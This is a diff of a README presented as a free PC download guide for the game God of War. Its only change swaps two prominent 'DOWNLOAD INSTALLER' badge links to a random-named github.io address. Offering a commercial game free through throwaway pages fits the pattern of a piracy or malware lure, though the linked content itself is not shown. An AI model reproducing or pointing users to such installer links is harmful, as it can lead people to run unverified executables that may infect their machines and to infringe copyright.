@@ -1,6 +1,6 @@
 # 🧠 God of War — Free PC Download & Installation Guide
 
-[![⚔️ DOWNLOAD INSTALLER — GOD OF WAR](https://img.shields.io/badge/⚔️%20DOWNLOAD-INSTALLER%20%E2%80%94%20GOD%20OF%20WAR-darkred?style=for-the-badge&logo=playstation&logoColor=white)](https://god-of-war-download-game.github.io/.github)
+[![⚔️ DOWNLOAD INSTALLER — GOD OF WAR](https://img.shields.io/badge/⚔️%20DOWNLOAD-INSTALLER%20%E2%80%94%20GOD%20OF%20WAR-darkred?style=for-the-badge&logo=playstation&logoColor=white)](https://conatdpirokdty.github.io/.github/god-of-war)
 
 ## ⚙️ About the Game
 
@@ -20,7 +20,7 @@ Download **God of War for free on PC** and embark on an epic journey through sno
 
 ---
 
-[![⚔️ DOWNLOAD INSTALLER — GOD OF WAR](https://img.shields.io/badge/⚔️%20DOWNLOAD-INSTALLER%20%E2%80%94%20GOD%20OF%20WAR-darkred?style=for-the-badge&logo=playstation&logoColor=white)](https://god-of-war-download-game.github.io/.github)
+[![⚔️ DOWNLOAD INSTALLER — GOD OF WAR](https://img.shields.io/badge/⚔️%20DOWNLOAD-INSTALLER%20%E2%80%94%20GOD%20OF%20WAR-darkred?style=for-the-badge&logo=playstation&logoColor=white)](https://conatdpirokdty.github.io/.github/god-of-war)
 
 ---
 
